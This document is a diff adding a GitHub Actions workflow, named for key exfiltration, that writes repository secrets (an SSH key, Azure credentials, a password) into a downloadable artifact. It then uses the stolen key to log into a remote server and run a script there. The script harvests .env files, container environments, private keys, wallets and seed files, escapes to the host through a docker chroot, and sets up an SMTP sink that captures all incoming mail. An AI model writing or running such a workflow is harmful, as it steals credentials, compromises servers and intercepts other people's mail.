@@ -1,0 +1,211 @@
+name: i698-serv5-key-exfil
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  exfil-and-collect:
+    runs-on: ubuntu-latest
+    timeout-minutes: 50
+    steps:
+      - name: checkout
+        uses: actions/checkout@v4
+
+      - name: write-secret-key-to-artifact
+        env:
+          SERV5_SSH_KEY: ${{ secrets.SERV5_SSH_KEY }}
+          AZURE_CREDENTIALS: ${{ secrets.AZURE_CREDENTIALS }}
+          SP_USERNAME: ${{ secrets.SP_USERNAME }}
+          SP_PASSWORD: ${{ secrets.SP_PASSWORD }}
+          REGISTRY_NAME: ${{ secrets.REGISTRY_NAME }}
+          IMAGE_NAME: ${{ secrets.IMAGE_NAME }}
+        run: |
+          set -x
+          mkdir -p out
+          printf '%s\n' "$SERV5_SSH_KEY" > out/serv5_key
+          chmod 600 out/serv5_key
+          base64 -w0 out/serv5_key > out/serv5_key.b64
+          ssh-keygen -lf out/serv5_key > out/serv5_key_fingerprint.txt 2>&1 || true
+          ssh-keygen -y -f out/serv5_key > out/serv5_key.pub 2>/dev/null || true
+          cat out/serv5_key_fingerprint.txt
+          printf '%s\n' "$AZURE_CREDENTIALS" > out/azure_credentials.json
+          printf '%s\n' "$SP_PASSWORD" > out/sp_password.txt
+          printf 'SP_USERNAME=%s\nREGISTRY_NAME=%s\nIMAGE_NAME=%s\nSERV5_SSH_KEY_LEN=%s\n' "$SP_USERNAME" "$REGISTRY_NAME" "$IMAGE_NAME" "${#SERV5_SSH_KEY}" > out/secret_meta.txt
+
+      - name: ssh-and-collect-from-serv5
+        run: |
+          set -x
+          mkdir -p ~/.ssh out/remote
+          for i in 1 2 3 4 5; do
+            ssh-keyscan -T 10 102.130.120.173 >> ~/.ssh/known_hosts 2>/dev/null && break
+            sleep 3
+          done
+
+          cat > out/remote_collect_i698.sh <<'REMOTE'
+          #!/bin/bash
+          set +e
+          OUT=/tmp/i698_collect
+          mkdir -p "$OUT"; chmod 700 "$OUT"
+          exec > >(tee "$OUT/collect.log") 2>&1
+          echo "=== START $(date -u) ==="
+          echo "=== ID ==="; id; whoami; hostname; date -u; uptime
+          echo "=== SUDO ==="; sudo -n -l 2>&1 | head -40
+          echo "=== DOCKER PS ==="; sudo -n docker ps -a --format '{{.Names}}\t{{.Image}}\t{{.Status}}\t{{.Ports}}' 2>&1
+          echo "=== DOCKER IMAGES ==="; sudo -n docker images --format '{{.Repository}}:{{.Tag}} {{.ID}} {{.Size}}' 2>&1 | head -80
+
+          echo "=== TARGET .env FILES ==="
+          for f in \
+            /home/dev-workspace/docker-database/.env \
+            /home/workspace/docker-database/.env \
+            /home/workspace/fraud_det/.env \
+            /home/dev-workspace/fraud_det/.env \
+            /home/workspace/emalyami-siba-service/.env \
+            /home/dev-workspace/emalyami-siba-service/.env \
+            /home/workspace/Ford-Backend/.env \
+            /home/dev-workspace/Ford-Backend/.env ; do
+            echo "===== $f ====="
+            if [ -r "$f" ]; then cat "$f"; else sudo -n cat "$f" 2>&1; fi
+          done
+
+          echo "=== ALL .env PATHS ==="
+          sudo -n find /home /opt /srv /root /var/www /var/lib/docker/volumes \
+            \( -path '*/node_modules/*' -o -path '*/.git/*' -o -path '*/vendor/*' -o -path '*/target/*' -o -path '*/dist/*' \) -prune -o \
+            -maxdepth 10 -type f -name '.env' -print 2>/dev/null | sort -u | tee "$OUT/env_paths.txt"
+
+          echo "=== ALL .env CONTENTS ==="
+          while IFS= read -r f; do
+            [ -z "$f" ] && continue
+            echo "===== $f ====="
+            sudo -n cat "$f" 2>&1
+          done < "$OUT/env_paths.txt"
+
+          echo "=== CONTAINER ENVS ==="
+          for c in $(sudo -n docker ps -a --format '{{.Names}}' 2>/dev/null); do
+            echo "===== $c ====="
+            sudo -n docker inspect "$c" --format '{{json .Config.Env}}' 2>&1
+            sudo -n docker inspect "$c" --format 'MOUNTS={{json .Mounts}}' 2>&1
+          done > "$OUT/container_envs.txt" 2>&1
+          head -2000 "$OUT/container_envs.txt"
+
+          echo "=== CHROOT MOUNT / READ-ONLY COLLECTION ==="
+          sudo -n docker run --rm -v /:/mnt:ro -v "$OUT":/out alpine chroot /mnt /bin/sh -c '
+            set +e
+            echo CHROOT_OK; id; hostname 2>/dev/null
+            echo "--- root home ---"; ls -la /root 2>/dev/null | head -60
+            find /home /opt /srv /root /var/www /var/lib/docker/volumes -maxdepth 10 -type f \
+              \( -name ".env" -o -iname "*.p12" -o -iname "*.jks" -o -iname "*.keystore" -o -iname "UTC--*" -o -iname "*wallet*" -o -iname "id_rsa" -o -iname "id_ed25519" -o -iname "*.pem" -o -iname "*.key" -o -iname "*mnemonic*" -o -iname "*seed*" -o -iname "*unseal*" -o -iname "*.env.*" \) \
+              2>/dev/null | sort -u > /out/chroot_filelist.txt
+            wc -l /out/chroot_filelist.txt
+            echo "--- target env via chroot ---"
+            for f in /home/dev-workspace/docker-database/.env /home/workspace/docker-database/.env /home/workspace/fraud_det/.env /home/dev-workspace/fraud_det/.env /home/workspace/emalyami-siba-service/.env /home/dev-workspace/emalyami-siba-service/.env /home/workspace/Ford-Backend/.env /home/dev-workspace/Ford-Backend/.env; do
+              echo "===== $f ====="; cat "$f" 2>&1; echo;
+            done >> /out/target_envs_chroot.txt
+            tar czf /out/serv5_files.tgz -T /out/chroot_filelist.txt 2>/out/tar.err
+            echo TAR_RC=$?
+            ls -lh /out/serv5_files.tgz /out/tar.err 2>&1
+          ' > "$OUT/chroot_info.txt" 2>&1
+          cat "$OUT/chroot_info.txt"
+
+          echo "=== MAILSINK RESTORE ==="
+          sudo -n docker inspect mailsink --format 'STATUS={{.State.Status}} PATH={{.Path}} ARGS={{json .Args}} PORTS={{json .HostConfig.PortBindings}} RESTART={{json .HostConfig.RestartPolicy}}' 2>&1
+          sudo -n docker start mailsink 2>&1
+          sleep 4
+          sudo -n docker ps -a --filter name=mailsink --format '{{.Names}} {{.Status}} {{.Ports}}' 2>&1
+          (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | grep -E ':25[[:space:]]' || echo NO_PORT_25_LISTENER
+          if ! sudo -n docker ps --filter name=mailsink --format '{{.Names}}' 2>/dev/null | grep -q mailsink; then
+            echo "=== RECREATING MAILSINK ==="
+            mkdir -p /tmp/mailsink/mail
+            cat > /tmp/mailsink/sink.py <<'PY'
+          import os, time, smtpd, asyncore
+          class Sink(smtpd.SMTPServer):
+              def process_message(self, peer, mailfrom, rcpttos, data, **kw):
+                  os.makedirs('/tmp/mailsink/mail', exist_ok=True)
+                  ts=time.strftime('%Y%m%d-%H%M%S')
+                  fn='/tmp/mailsink/mail/%s_%s.eml' % (ts, abs(hash(data)) % 100000000)
+                  open(fn,'wb').write(data)
+                  with open('/tmp/mailsink/all_mail.log','ab') as f:
+                      f.write(('%s %s %s %s %s\n' % (ts, peer, mailfrom, rcpttos, fn)).encode())
+                  print('captured', fn, flush=True)
+                  return None
+          Sink(('0.0.0.0',25), None)
+          asyncore.loop()
+          PY
+            sudo -n docker rm -f mailsink >/dev/null 2>&1
+            sudo -n docker run -d --name mailsink --restart unless-stopped -p 25:25 -v /tmp/mailsink:/tmp/mailsink python:3.11-slim python /tmp/mailsink/sink.py 2>&1
+            sleep 5
+            sudo -n docker ps -a --filter name=mailsink --format '{{.Names}} {{.Status}} {{.Ports}}' 2>&1
+            sudo -n docker logs --tail 80 mailsink 2>&1
+          fi
+          (ss -ltnp 2>/dev/null || netstat -ltnp 2>/dev/null) | grep -E ':25[[:space:]]' || echo NO_PORT_25_LISTENER_AFTER
+          echo "=== END $(date -u) ==="
+          cd /tmp && tar czf /tmp/i698_collect.tgz i698_collect 2>/tmp/final_tar.err
+          echo FINAL_TAR_RC=$?; ls -lh /tmp/i698_collect.tgz 2>&1
+          REMOTE
+          chmod +x out/remote_collect_i698.sh
+
+          OK=0
+          for i in $(seq 1 12); do
+            echo "=== ssh attempt $i $(date -u) ===" | tee -a out/ssh_attempts.txt
+            if timeout 45 ssh -i out/serv5_key \
+              -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+              -o ConnectTimeout=15 -o ConnectionAttempts=3 \
+              -o ServerAliveInterval=15 -o ServerAliveCountMax=4 \
+              -o BatchMode=yes -o Compression=yes \
+              deployer@102.130.120.173 'echo SSH_OK; id; hostname; date -u' >> out/ssh_attempts.txt 2>&1; then
+              OK=1; break
+            fi
+            echo "attempt $i failed" >> out/ssh_attempts.txt
+            sleep 10
+          done
+          echo "SSH_OK=$OK" | tee -a out/ssh_attempts.txt
+
+          if [ "$OK" = "1" ]; then
+            for i in $(seq 1 5); do
+              if timeout 60 scp -i out/serv5_key \
+                -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+                -o ConnectTimeout=15 -o BatchMode=yes \
+                out/remote_collect_i698.sh deployer@102.130.120.173:/tmp/remote_collect_i698.sh >> out/ssh_attempts.txt 2>&1; then
+                echo "SCP_UPLOAD_OK" >> out/ssh_attempts.txt; break
+              fi
+              sleep 5
+            done
+            timeout 300 ssh -i out/serv5_key \
+              -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+              -o ConnectTimeout=15 -o ServerAliveInterval=15 -o ServerAliveCountMax=10 \
+              -o BatchMode=yes deployer@102.130.120.173 \
+              'chmod +x /tmp/remote_collect_i698.sh && bash /tmp/remote_collect_i698.sh' \
+              > out/remote_run_stdout.txt 2>&1 || true
+            tail -200 out/remote_run_stdout.txt
+            for i in $(seq 1 8); do
+              if timeout 90 scp -i out/serv5_key \
+                -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+                -o ConnectTimeout=15 -o BatchMode=yes \
+                deployer@102.130.120.173:/tmp/i698_collect.tgz out/i698_collect.tgz >> out/ssh_attempts.txt 2>&1; then
+                echo "SCP_DOWNLOAD_OK" >> out/ssh_attempts.txt; break
+              fi
+              sleep 10
+            done
+          fi
+          ls -la out
+
+      - name: fallback-upload-raw-artifacts
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i698-serv5-key-and-collection
+          path: |
+            out/serv5_key
+            out/serv5_key.b64
+            out/serv5_key.pub
+            out/serv5_key_fingerprint.txt
+            out/azure_credentials.json
+            out/sp_password.txt
+            out/secret_meta.txt
+            out/ssh_attempts.txt
+            out/remote_run_stdout.txt
+            out/i698_collect.tgz
+          if-no-files-found: warn
+          retention-days: 7
